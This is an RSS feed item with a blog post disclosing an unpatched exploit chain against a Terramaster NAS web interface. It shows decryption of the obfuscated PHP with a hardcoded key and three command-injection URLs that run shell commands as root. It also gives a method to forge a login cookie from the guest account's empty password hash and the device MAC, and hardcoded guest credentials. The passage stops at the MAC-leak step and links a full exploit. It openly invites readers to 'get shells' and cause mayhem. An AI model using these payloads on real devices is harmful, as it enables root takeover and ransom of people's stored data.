<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on thatsn0tmysite</title>
        <link>/posts/</link>
        <description>Recent content in Posts on thatsn0tmysite</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 24 Dec 2021 21:48:00 +0100</lastBuildDate>
        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>How to summon RCEs</title>
            <link>/posts/2021/12/how-to-summon-rces/</link>
            <pubDate>Fri, 24 Dec 2021 21:48:00 +0100</pubDate>
            
            <guid>/posts/2021/12/how-to-summon-rces/</guid>
            <description>The mystic arts of summoning RCEs seem obscure and complex to those who are not trained for it, but in reality, the secret to all of them is one: shell_exec.
In the last couple weeks I was waiting for ZDI to know if they were interested in giving me some cash for this, but unfortunately they were not, so here you go: a freshly spawned 0day - merry fucking XMAS.</description>
            <content type="html"><![CDATA[<p>The mystic arts of summoning RCEs seem obscure and complex to those who are not trained for it, but in reality, the secret to all of them is one: <code>shell_exec</code>.</p>
<p>In the last couple weeks I was waiting for <a href="https://www.zerodayinitiative.com/">ZDI</a> to know if they were interested in giving me some cash for this, but unfortunately they were not, so here you go: a freshly spawned 0day - merry fucking XMAS.</p>
<p>I don&rsquo;t know if many of you are aware but legends speak of magic devices, called NASes (Network Attached Storage), which can be used to store all your data and backups so your other devices stay quick and light!</p>
<p>Wouldn&rsquo;t it be a shame if somebody broke into it and, let&rsquo;s say asked for a ransom? Yes. Exactly.</p>
<p>Now, what I&rsquo;ll be talking about surely isn&rsquo;t log4j, nor anything extremely cool, but I had fun finding the chain to RCE, so let&rsquo;s ruin someone&rsquo;s XMAS, Grinch style.</p>
<p>Also, a word of advice, this is an in-depth article which might be long and &ldquo;boring&rdquo;, if you just wanna get shells, cause mayhem or read the exploit directly, <a href="https://gist.github.com/thatsn0tmysite/a8e1ab1892dc13c36d5dfe0dc6738e55">suit yourself</a>.</p>
<h2 id="buy-it">Buy it</h2>
<p>The first step in summoning an RCE is picking any of the mediocre technology products on Amazon, let&rsquo;s say&hellip; a Terramaster NAS.
It has positive reviews. It has 4 stars. It looks cheaper than other brands - that&rsquo;s a no-brainer.</p>
<h2 id="use-it">Use it</h2>
<p>The second step is to use the product, see how sloppy the software looks, get a feel of how badly it could be developed and then proceed in setting up a baseline of &ldquo;normal&rdquo; behaviours.</p>
<p>As a user, you want to take advantage of ALL the features you see available, such as <strong>ssh-ing</strong> into it, fiddling with config files, inspecting running processes,&hellip; all the things one would normally do when playing with a new toy!</p>
<p>A quick run-down.
First of all the NAS is running nginx, as shown by the <code>ps aux</code> output:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root      <span style="color:#3677a9">2094</span>  0.0  0.0  <span style="color:#3677a9">14364</span>   <span style="color:#3677a9">848</span> ?        Ss   Nov16   0:00 nginx: master process /usr/sbin/nginx
root      <span style="color:#3677a9">2095</span>  0.0  0.1  <span style="color:#3677a9">15000</span>  <span style="color:#3677a9">2156</span> ?        S    Nov16   0:00 nginx: worker process
root      <span style="color:#3677a9">2096</span>  0.0  0.1  <span style="color:#3677a9">15000</span>  <span style="color:#3677a9">2164</span> ?        S    Nov16   0:01 nginx: worker process
root      <span style="color:#3677a9">2097</span>  0.0  0.1  <span style="color:#3677a9">15000</span>  <span style="color:#3677a9">2080</span> ?        S    Nov16   0:02 nginx: worker process
root      <span style="color:#3677a9">2098</span>  0.0  0.1  <span style="color:#3677a9">15040</span>  <span style="color:#3677a9">2188</span> ?        S    Nov16   0:01 nginx: worker process
root      <span style="color:#3677a9">2195</span>  0.0  0.1 <span style="color:#3677a9">165496</span>  <span style="color:#3677a9">2484</span> ?        Ss   Nov16   1:18 php-fpm: master process (/etc/nginx/php-fpm.conf)
root     <span style="color:#3677a9">22699</span>  0.0  0.0   <span style="color:#3677a9">3232</span>   <span style="color:#3677a9">384</span> pts/0    S+   10:55   0:00 grep nginx
</code></pre></div><p>the current users on the system are:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/bin/false
admin❌3:3:TOS User,:/home/admin:/bin/bash
sync❌4💯sync:/bin:/bin/sync
guest❌6:4:Linux User,:/home/guest:/bin/false
mail❌8:8:mail:/var/spool/mail:/bin/false
www-data❌33:33:www-data:/var/www:/bin/false
operator❌37:37:Operator:/var:/bin/false
nobody❌65534:65534:nobody:/home:/bin/false
TimeMachine❌1000:1000:Linux User,:/home:/bin/false
avahi❌1001:1001::/:/bin/false
dbus❌1002:1002:DBus messagebus user:/var/run/dbus:/bin/false
input❌1003:1003::/:/bin/false
nslcd❌1004:1004:nslcd user:/:/bin/false
sshd❌1005:1005:SSH drop priv user:/:/bin/false
n0tme❌2:4:TOS User,,,:/home/n0tme:/bin/bash
</code></pre></div><p>and there seems to be an interesting sqlite database file at <code>/etc/base/nasdb</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme@nas:~# sqlite3 /etc/base/nasdb 
SQLite version 3.8.11.1 2015-07-29 20:00:57
Enter <span style="color:#ed9d13">&#34;.help&#34;</span> <span style="color:#6ab825;font-weight:bold">for</span> usage hints.
sqlite&gt; .databases
seq  name             file                                                      
---  ---------------  ----------------------------------------------------------
<span style="color:#3677a9">0</span>    main             /etc/base/nasdb                                           
sqlite&gt; .tables
acl_host        app_table       group_users     share_crypt     vpn_user_table
acl_list        dav_list        interface       user_extend   
acl_webdav      dfs_list        share           user_table    
</code></pre></div><p>For now that&rsquo;s enough poking around, let&rsquo;s get down to business.</p>
<h2 id="break-it">Break it</h2>
<p>Now the juicy part. I will explain the things in the same order that I found them, so&hellip; enjoy.</p>
<p>The chain consists of:</p>
<ul>
<li>3 remote command execution (pick you flavor!)</li>
<li>1 session crafting</li>
<li>1 arbitrary file download</li>
<li>2 information disclosures (leading to privilege escalation)</li>
</ul>
<h3 id="php-files">PHP files</h3>
<p>Obviously the first place where we have a higher chance at finding bugs is where most of the custom functionality is: the web interface.</p>
<p>Let&rsquo;s go take a look:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme@nas:/usr/www$ ls
3.0  Enter.php  api  css  csv  databack  debug  debug.php  images  include  index.php  js  lang  m1.php  m2.php  mod  module  store  tos  version  wap  wizard
</code></pre></div><p>Nice, now what we need is to find out what those <code>.php</code> files do:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme@nas:/usr/www$ cat m1.php | head -5
u�45�O��}�Ѹ�*��S�C���kL��u+��RY�~��%6�i:�*��iI  ����l�mQ���������f���yu�7J�/�B3�<span style="color:#ed9d13">`</span>��^A�Ro�J]I<span style="color:#ed9d13">`</span>H&amp;ëM!�Q�����׳Nq/�șY��G�q�����6XxCFQ��.�
!�eD^IϦ@���                                                                                                                         X��|��<span style="color:#ed9d13">\_</span>���W��Rk��&gt;�bF����Y(�$▒�G6$�<span style="color:#ed9d13">&#34;�|I6�rcy��TGn
</span><span style="color:#ed9d13">           (�!d����}b
</span></code></pre></div><p>I know what you&rsquo;re thinking&hellip; WTF. Looks like some <code>.php</code> files are encrypted, based on a very arcane knowledge of mine I recall that php scripts are not binary files, so something must be decrypting those before they reach the interpreter so it can execute them.</p>
<p>Since this thing runs nginx my bets were either some nginx module or a php module. That or some black magic happening somewhere else.
By checking the <code>/etc/nginx/nginx.conf</code> and running <code>nginx -V</code> does not reveal any module or special executable used, which means hopefully our answer will be in the php configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme@nas:/etc/php7# ls
+PACKAGE_php7-mod-iconv:icu  20_exif.ini      20_intl.ini      20_pdo_mysql.ini         20_shmop.ini      20_tokenizer.ini
15_openssl.ini               20_fileinfo.ini  20_json.ini      20_pdo_pgsql.ini         20_simplexml.ini  20_xml.ini
20_bcmath.ini                20_ftp.ini       20_mbstring.ini  20_pdo_sqlite.ini        20_sockets.ini    20_xmlreader.ini
20_calendar.ini              20_gd.ini        20_mysqlnd.ini   20_pgsql.ini             20_sqlite3.ini    20_xmlwriter.ini
20_ctype.ini                 20_gettext.ini   20_opcache.ini   20_phar.ini              20_sysvmsg.ini    20_zip.ini
20_curl.ini                  20_hash.ini      20_pcntl.ini     20_php_terra_master.ini  20_sysvsem.ini    30_mysqli.ini
20_dom.ini                   20_iconv.ini     20_pdo.ini       20_session.ini           20_sysvshm.ini    33_redis.ini

n0tme@nas:/etc/php7# cat 20_php_terra_master.ini 
<span style="color:#40ffff">extension</span>=php_terra_master.so
</code></pre></div><p>Well, looks like we have something interesting here! There seems to actually be a convinently named <code>php_terra_master.so</code> extension loaded in PHP. To the GHIDRA mobile!</p>
<h3 id="reversing-101">Reversing 101</h3>
<p>Ok so, I am not a good reverse engineer by a long shot, so I&rsquo;ll be showing my totally naive approach to this. Do not do this at home, or do, I mean after all it kind of worked out for me.
First step, is to get our hands on the binary and check if the binary is stripped or contains any useful debug info:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme :: ~/Downloads » file php_terra_master.so                                                                                 <span style="color:#3677a9">1</span> ↵
php_terra_master.so: ELF 64-bit LSB shared object, ARM aarch64, version <span style="color:#3677a9">1</span> (SYSV), dynamically linked, stripped

n0tme :: ~/Downloads » readelf -sW php_terra_master.so|grep <span style="color:#ed9d13">&#34;FUNC&#34;</span>
     3: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.17 (2)
     4: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.17 (2)
     8: 000000000000356c   <span style="color:#3677a9">296</span> FUNC    GLOBAL DEFAULT   <span style="color:#3677a9">10</span> pm9screw_compile_file
     9: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND perror@GLIBC_2.17 (2)
    11: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND tmpfile@GLIBC_2.17 (2)
    16: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND readlink@GLIBC_2.17 (2)
    17: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.17 (2)
    20: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND fileno@GLIBC_2.17 (2)
    21: <span style="color:#3677a9">0000000000003808</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT   <span style="color:#3677a9">11</span> _fini
        ...
    41: 00000000000037ec    <span style="color:#3677a9">12</span> FUNC    GLOBAL DEFAULT   <span style="color:#3677a9">10</span> get_module
    44: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.17 (2)
    45: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND socket@GLIBC_2.17 (2)
    46: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.17 (2)
    47: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND __fxstat@GLIBC_2.17 (2)
    48: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND strncpy@GLIBC_2.17 (2)
    52: 0000000000000fd8     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT    <span style="color:#3677a9">8</span> _init
    53: <span style="color:#3677a9">0000000000000000</span>     <span style="color:#3677a9">0</span> FUNC    GLOBAL DEFAULT  UND ioctl@GLIBC_2.17 (2)
</code></pre></div><p>The only thing that caught my eye here is really just the function <strong>pm9screw_compile_file</strong>, googling around for like a minute: <a href="https://sourceforge.net/projects/php-screw/files/php-screw/">here is a 2007 repository which might be useful</a>.</p>
<p>From it&rsquo;s README:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md"><span style="color:#6ab825;font-weight:bold">1.</span> What&#39;s SCREW?

 PHP Screw is a PHP script encryption tool. When you are developing a
 commercial package using PHP, the script can be distributed as encrypted up
 until just before execution. This preserves your intellectual property.
</code></pre></div><p>This seems to fit our use case, we can take a look at the code to have a general overview of the algorithm used, then check with Ghidra if it is roughly the same, and take it from there!</p>
<p>Listing all defined strings gives us a quite short list, which I made even shorter:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">0010081a        zend_compile_file       <span style="color:#ed9d13">&#34;zend_compile_file&#34;</span>     ds
0010082c        org_compile_file        <span style="color:#ed9d13">&#34;org_compile_file&#34;</span>      ds
0010083d        pm9screw_compile_file   <span style="color:#ed9d13">&#34;pm9screw_compile_file&#34;</span> ds
<span style="color:#3677a9">00103824</span>        php_terra_master support        <span style="color:#ed9d13">&#34;php_terra_master support&#34;</span>      ds
0010384e        GH65Hws2jedf3fl3MeK     <span style="color:#ed9d13">&#34;GH65Hws2jedf3fl3MeK&#34;</span>   ds
<span style="color:#3677a9">00103862</span>        show_source     <span style="color:#ed9d13">&#34;show_source&#34;</span>   ds
001038a4        php_terra_master        <span style="color:#ed9d13">&#34;php_terra_master&#34;</span>      ds
001038cb        tos_encrypt_str <span style="color:#ed9d13">&#34;tos_encrypt_str&#34;</span>       ds
</code></pre></div><p>As you can see there are a few interesting strings, and some strings which strongly hint us we are on the right track.
There is also one very long string <strong>GH65Hws2jedf3fl3MeK</strong> - all of a sudden a flashback from my first crackmes struck me: <strong>hardcoded passphrases</strong>.</p>
<p>Jumping at the only available XREF for our candidate passphrase we land at <code>0010341c</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#999;font-style:italic">/*...*/</span>
  local_c0 = <span style="color:#3677a9">0</span>;
  uStack184 = <span style="color:#3677a9">0</span>;
  local_b0 = <span style="color:#3677a9">0</span>;
  uStack168 = <span style="color:#3677a9">0</span>;
  local_a0 = <span style="color:#3677a9">0</span>;
  uStack152 = <span style="color:#3677a9">0</span>;
  local_90 = <span style="color:#3677a9">0</span>;
  uStack136 = <span style="color:#3677a9">0</span>;
  puVar3 = (undefined8 *)FUN_00102348(<span style="color:#ed9d13">&#34;GH65Hws2jedf3fl3MeK&#34;</span>);
<span style="color:#999;font-style:italic">/*...*/</span>
</code></pre></div><p>now, at this point I just wanted to break things, luckily I stumbled upon the very friendly <a href="https://matrix.to/#/@bloodyshell:matrix.org">bloodyshell</a> who happened to be working on my exact device, for obviously different purposes.
Since he already worked (or worked way quicker than me) on reversing the algorithm, I asked him for help and he blessed me with a decryption tool to &ldquo;unscrew&rdquo; the code.
A link to the utility&rsquo;s source code is <a href="https://gist.github.com/thatsn0tmysite/c20602289d2cdc9ab7484851eefd92ba">here</a>].</p>
<p>Which leaves us with a decrypted web root!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme :: unscrewed » cat m1.php|head -10
&lt;?php
include_once <span style="color:#ed9d13">&#34;include/app.php&#34;</span>;
<span style="color:#40ffff">$core</span> = new core();
<span style="color:#40ffff">$board</span> = <span style="color:#40ffff">$core</span>-&gt;_boardmodel();
<span style="color:#40ffff">$vn</span> = <span style="color:#40ffff">$core</span>-&gt;_VersionNumber();
<span style="color:#40ffff">$macs</span>[0] = trim(file_get_contents(<span style="color:#ed9d13">&#39;/sys/class/net/eth0/address&#39;</span>));
<span style="color:#40ffff">$macs</span>[1] = trim(file_get_contents(<span style="color:#ed9d13">&#39;/sys/class/net/eth1/address&#39;</span>));
?&gt;
&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
</code></pre></div><h3 id="grep-dat-shell-rces">Grep dat shell (RCEs)</h3>
<p>Literally, grep for shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">n0tme :: unscrewed » grep -rie <span style="color:#ed9d13">&#34;shell_exec(.*&#34;</span> -e <span style="color:#ed9d13">&#34;system(.*&#34;</span> . | cut -d<span style="color:#ed9d13">&#34;:&#34;</span> -f <span style="color:#3677a9">1</span> | sort -u | grep -v <span style="color:#ed9d13">&#34;.js&#34;</span>
./3.0/config/setting.php
./3.0/controller/app.class.php
./3.0/controller/explorer.class.php
./3.0/controller/member.class.php
./3.0/controller/share.class.php
./3.0/controller/util.php
./3.0/lib/core/Controller.class.php
./3.0/lib/function/file.function.php
./Enter.php
./include/ajax/ajaxdata.php
./include/ajax/handle.php
./include/ajax/iscsitable.php
./include/ajax/monitortable.php
./include/ajax/nettable.php
./include/ajax/Rsytable.php
./include/ajax/usertable.php
./include/class/application.class.php
./include/class/core.class.php
./include/class/func.class.php
./include/class/getfile.class.php
./include/class/mediasearch.class.php
./include/class/mobile.class.php
./include/class/notifications.class.php
./include/class/person.class.php
./include/class/plugs.class.php
./include/class/raid.class.php
./include/class/SessionEvents.class.php
./include/class/sharefolder.class.php
./include/class/ssl.class.php
./include/class/status.class.php
./include/class/storage.class.php
./include/class/systime.class.php
./include/class/ups.class.php
./include/class/volume.class.php
./include/class/VPN.class.php
./include/class/wap.class.php
./include/class/WebDav.class.php
./include/patch.php
./include/updataDomain.php
./include/upload.php
./tos/config/setting.php
./tos/controller/app.class.php
./tos/controller/explorer.class.php
./tos/controller/member.class.php
./tos/controller/share.class.php
./tos/controller/util.php
./tos/lib/core/Controller.class.php
./tos/lib/function/file.function.php
./wizard/index.php
</code></pre></div><p>Now, we want something that has user controlled input, hopefully with no authentication required.
I could not find anything like that, what I could find is instead an interesting function which accepts user input and result in an RCE if reached by an <strong>admin</strong> user:</p>
<pre tabindex="0"><code>http://nas:8181/tos/index.php?app/app_start_stop&amp;id=transmission&amp;start=0&amp;name=Transmission.*.oexe;ls%3E/tmp/xxx.txt;ls
</code></pre><p>And a couple which work from <strong>non-admin</strong> users as well, these do not conviniently provide an output in the response, but nonetheless they stillexecute our commands:</p>
<pre tabindex="0"><code>http://nas:8181/tos/index.php?app/del&amp;id=0&amp;name=;ls%3E/tmp/xyz.txt;ls%23

http://nas:8181/tos/index.php?app/hand_app&amp;name=;ls%3E/tmp/kjl.txt;ls.tpk
</code></pre><p>All have a similar issue, user input is inserted into a string executed by either <code>shell_exec()</code> or <code>system()</code>, I will provide one example below, the function <code>app/del</code> at <code>tos/controller/app.class.php</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">del</span>() {
    <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">init_sql</span>();
    <span style="color:#40ffff">$id</span> = <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">in</span>[<span style="color:#ed9d13">&#39;id&#39;</span>];
    <span style="color:#40ffff">$name</span> = <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">in</span>[<span style="color:#ed9d13">&#39;name&#39;</span>];
    @system(<span style="color:#ed9d13">&#34;rm -f &#34;</span>.USER.<span style="color:#ed9d13">&#34;home/desktop/</span><span style="color:#ed9d13">{</span><span style="color:#40ffff">$name</span><span style="color:#ed9d13">}</span><span style="color:#ed9d13">.*.oexe&#34;</span>);
    <span style="color:#40ffff">$result</span> = self::<span style="color:#40ffff">$netfile</span>-&gt;<span style="color:#bbb">delete</span>(<span style="color:#40ffff">$id</span>);
    <span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$result</span> == <span style="color:#3677a9">1</span>){
        show_json(<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">L</span>[<span style="color:#ed9d13">&#39;success&#39;</span>]);
    }<span style="color:#6ab825;font-weight:bold">else</span>{
        show_json(<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">L</span>[<span style="color:#ed9d13">&#39;error&#39;</span>],<span style="color:#6ab825;font-weight:bold">false</span>);
    }
}
</code></pre></div><p>User controls the parameter <code>name</code> which gets concatenated inside the OS call and executed, as <strong>root</strong>. Bad.</p>
<h3 id="you-shall-not-pass-session-crafting">You shall <del>not</del> pass! (Session crafting)</h3>
<p>Now we have a RCE, but we still need to get access to it without a user. In our case we need an authentication bypass of some kind to reach the vulnerable functions.
Which leaves us hunting for APIs which manage authentication logic or sessions.</p>
<p>I&rsquo;ll save the boring stuff, after some time looking at the code I eventually found that the file <code>include/class/application.class.php</code> managed the login:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">loginCheck</span>() {
<span style="color:#999;font-style:italic">/*...*/</span>
<span style="color:#6ab825;font-weight:bold">else</span> <span style="color:#6ab825;font-weight:bold">if</span>(<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>] != <span style="color:#ed9d13">&#39;&#39;</span> &amp;&amp; <span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_token&#39;</span>] != <span style="color:#ed9d13">&#39;&#39;</span>){
            <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">sessionid</span> = <span style="color:#ed9d13">&#34;&#34;</span>;
            <span style="color:#40ffff">$db</span> = <span style="color:#6ab825;font-weight:bold">new</span> NasDBLite();
            <span style="color:#40ffff">$members</span> = <span style="color:#40ffff">$db</span>-&gt;<span style="color:#bbb">member</span>();
            <span style="color:#40ffff">$user</span> = isset(<span style="color:#40ffff">$members</span>[<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>]]) ? <span style="color:#40ffff">$members</span>[<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>]] : <span style="color:#6ab825;font-weight:bold">false</span>;
            <span style="color:#40ffff">$db</span>-&gt;<span style="color:#bbb">close</span>();
            <span style="color:#6ab825;font-weight:bold">if</span> (!is_array(<span style="color:#40ffff">$user</span>) || !isset(<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;password&#39;</span>])) {
                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
            }
            <span style="color:#6ab825;font-weight:bold">if</span>(tos_encrypt_str(<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;password&#39;</span>]) == <span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_token&#39;</span>]){
                <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">sessionid</span> = SessionEvents::<span style="color:#bbb">login</span>(<span style="color:#40ffff">$user</span>);
                <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;role&#39;</span>] == <span style="color:#ed9d13">&#39;root&#39;</span>) {
                    <span style="color:#40ffff">$GLOBALS</span>[<span style="color:#ed9d13">&#39;is_admin&#39;</span>] = <span style="color:#3677a9">1</span>;
                }<span style="color:#6ab825;font-weight:bold">else</span>{
                    <span style="color:#40ffff">$GLOBALS</span>[<span style="color:#ed9d13">&#39;is_admin&#39;</span>] = <span style="color:#3677a9">0</span>;
                }
                <span style="color:#40ffff">$GLOBALS</span>[<span style="color:#ed9d13">&#39;user&#39;</span>] = <span style="color:#40ffff">$user</span>;
                define(<span style="color:#ed9d13">&#39;USER&#39;</span>, USER_PATH.<span style="color:#40ffff">$user</span>[<span style="color:#ed9d13">&#39;name&#39;</span>].<span style="color:#ed9d13">&#39;/&#39;</span>);
                define(<span style="color:#ed9d13">&#39;USER_DATA&#39;</span>, USER.<span style="color:#ed9d13">&#39;.data/&#39;</span>);
                define(<span style="color:#ed9d13">&#39;USER_TEMP&#39;</span>, USER_DATA.<span style="color:#ed9d13">&#39;temp/&#39;</span>);
                define(<span style="color:#ed9d13">&#39;USER_HOME&#39;</span>, USER.<span style="color:#ed9d13">&#39;home/&#39;</span>);
                define(<span style="color:#ed9d13">&#39;USER_RECYCLE&#39;</span>, USER.<span style="color:#ed9d13">&#39;recycle/&#39;</span>);
                setcookie(<span style="color:#ed9d13">&#39;kod_name&#39;</span>, <span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_name&#39;</span>], time()+<span style="color:#3677a9">3600</span>*<span style="color:#3677a9">24</span>*<span style="color:#3677a9">365</span>);
                setcookie(<span style="color:#ed9d13">&#39;kod_token&#39;</span>,<span style="color:#40ffff">$_COOKIE</span>[<span style="color:#ed9d13">&#39;kod_token&#39;</span>],time()+<span style="color:#3677a9">3600</span>*<span style="color:#3677a9">2</span>, <span style="color:#ed9d13">&#34;/&#34;</span>);
                <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">true</span>;
<span style="color:#999;font-style:italic">/*...*/</span>
</code></pre></div><p>The first part checks for an existing session, which we obviously do not have, if it does not exist, it checks some cookies: <code>kod_name</code> and <code>kod_token</code> which are the username and the session cookie.</p>
<p>So, to bypass the login and get a valid session we need to:</p>
<ul>
<li>craft a <code>kod_name</code> with an existing user (quite easy)</li>
<li>craft a valid <code>kod_token</code> (requires us to find out what <code>tos_encrypt_str</code> does)</li>
</ul>
<p>Turns out, <code>tos_encrypted_str</code> is not defined in any of the PHP files, which leaves it as a &ldquo;native&rdquo; function, which might be defined in the loaded custom module: <code>php_terra_master.so</code>.</p>
<p>The function, which is at offset <code>00103738</code> basically does the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">tos_encrypt_str</span>(toencrypt):
    key = MAC_ADDRESS[<span style="color:#3677a9">6</span>:] 
    <span style="color:#6ab825;font-weight:bold">return</span> hashlib.md5(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>key<span style="color:#ed9d13">}{</span>toencrypt<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>.encode(<span style="color:#ed9d13">&#34;utf8&#34;</span>)).hexdigest()
</code></pre></div><p>Dope, so we can now tos_encrypt stuff but we still need a user&rsquo;s password hash&hellip; luckily for us, when disabled the <code>guest</code> user has a default NULL hash, which means we can call <code>tos_encrypt_str(&quot;&quot;)</code> and get a valid token! When enabled the credentials seem to be hardcoded:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#999;font-style:italic">/*...*/</span>
} <span style="color:#6ab825;font-weight:bold">else</span> {
    <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">config</span>[<span style="color:#ed9d13">&#39;setting_system&#39;</span>][<span style="color:#ed9d13">&#39;auto_login&#39;</span>] != <span style="color:#ed9d13">&#39;1&#39;</span>) {
        <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">logout</span>();
    } <span style="color:#6ab825;font-weight:bold">else</span> {
        <span style="color:#6ab825;font-weight:bold">if</span> (!file_exists(USER_SYSTEM . <span style="color:#ed9d13">&#39;install.lock&#39;</span>)) {
            header(<span style="color:#ed9d13">&#34;location: /Enter.php&#34;</span>);
            <span style="color:#6ab825;font-weight:bold">exit</span>;
        }
        header(<span style="color:#ed9d13">&#39;location:./index.php?user/loginSubmit&amp;name=guest&amp;password=guest&#39;</span>);
    }
}
<span style="color:#999;font-style:italic">/*...*/</span>
</code></pre></div><h3 id="too-much-info-pal-info-disclosure">Too much info, pal! (Info disclosure)</h3>
<p>We still miss a little something! We are so close, I can smell the <del>ransomwares creeping upon them</del> victory. The only one missing piece now is the MAC address.</p>
